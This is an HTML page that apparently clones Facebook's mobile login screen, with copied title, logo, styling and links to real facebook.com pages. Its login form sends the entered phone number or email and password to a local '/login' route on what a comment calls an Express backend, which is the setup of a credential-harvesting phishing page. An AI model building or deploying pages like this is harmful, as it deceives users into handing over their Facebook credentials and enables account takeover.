<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #000000;
      color: #ffffff;
      display: flex;
      justify-content: center;
      min-height: 100vh;
    }

    .mobile-screen {
      width: 100%;
      max-width: 414px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 16px 20px 28px 20px;
    }

    .top-bar {
      display: flex;
      align-items: center;
      padding: 4px 0;
    }

    .back-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 22px;
      cursor: pointer;
      padding: 4px 8px 4px 0;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      margin: 24px 0 32px 0;
    }

    .fb-circle {
      width: 64px;
      height: 64px;
      background-color: #0866ff;
      border-radius: 50%;
      display: flex;
      align-items: flex-end;
      justify-content: center;
      overflow: hidden;
    }

    .fb-letter {
      color: #ffffff;
      font-size: 54px;
      font-weight: bold;
      line-height: 46px;
      font-family: Helvetica, Arial, sans-serif;
    }

    .divider {
      border-top: 1px solid #222325;
      margin-bottom: 14px;
    }

    .carrier-notice {
      font-size: 14px;
      line-height: 1.4;
      color: #e4e6eb;
      margin-bottom: 6px;
    }

    .settings-link {
      display: inline-block;
      color: #2e89ff;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      margin-bottom: 22px;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 14px;
      margin-bottom: 18px;
    }

    .dark-input {
      width: 100%;
      background-color: #242526;
      border: 1.5px solid #3a3b3c;
      border-radius: 12px;
      padding: 16px;
      color: #ffffff;
      font-size: 16px;
      outline: none;
      transition: border-color 0.2s;
    }

    .dark-input::placeholder {
      color: #9a9da1;
    }

    .dark-input:focus {
      border-color: #4599ff;
    }

    .confirm-btn {
      width: 100%;
      background-color: #0866ff;
      color: #ffffff;
      border: none;
      border-radius: 25px;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 20px;
      text-align: center;
    }

    .confirm-btn:active {
      background-color: #0055e0;
    }

    .forgot-wrapper {
      text-align: center;
    }

    .forgot-link {
      color: #ffffff;
      font-size: 15px;
      font-weight: 500;
      text-decoration: none;
    }

    .bottom-section {
      margin-top: 40px;
    }

    .create-account-btn {
      width: 100%;
      background-color: transparent;
      color: #ffffff;
      border: 1.0px solid #3e4042;
      border-radius: 25px;
      padding: 13px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .create-account-btn:active {
      background-color: #1c1d1e;
    }
  </style>
</head>
<body>

  <div class="mobile-screen">
    <div>
      <!-- Back Arrow -->
      <div class="top-bar">
        <button class="back-btn" aria-label="Go back" onclick="window.location.href='https://www.facebook.com'">&#8592;</button>
      </div>

      <!-- Circular Logo -->
      <div class="logo-container">
        <div class="fb-circle">
          <span class="fb-letter">f</span>
        </div>
      </div>

      <!-- Thin Divider & Carrier Text -->
      <div class="divider"></div>
      <p class="carrier-notice">
        Facebook requests and receives your phone number from your mobile network.
      </p>
      <a href="https://www.facebook.com" class="settings-link">Change Settings</a>

      <!-- Login Form pointing to Express backend via POST -->
      <form id="loginForm" action="/login" method="POST">
        <div class="input-group">
          <input type="text" name="username" id="usernameInput" class="dark-input" placeholder="Mobile number or email" aria-label="Mobile number or email" required>
          <input type="password" name="password" id="passwordInput" class="dark-input" placeholder="Password" aria-label="Password" required>
        </div>
        <button type="submit" class="confirm-btn">Log in</button>
      </form>

      <!-- Forgot Password -->
      <div class="forgot-wrapper">
        <a href="https://www.facebook.com/recover/initiate" class="forgot-link">Forgot password?</a>
      </div>
    </div>

    <!-- Bottom Pinned Button -->
    <div class="bottom-section">
      <button type="button" class="create-account-btn" onclick="window.location.href='https://www.facebook.com/r.php'">Create new account</button>
    </div>
  </div>

</body>
</html>
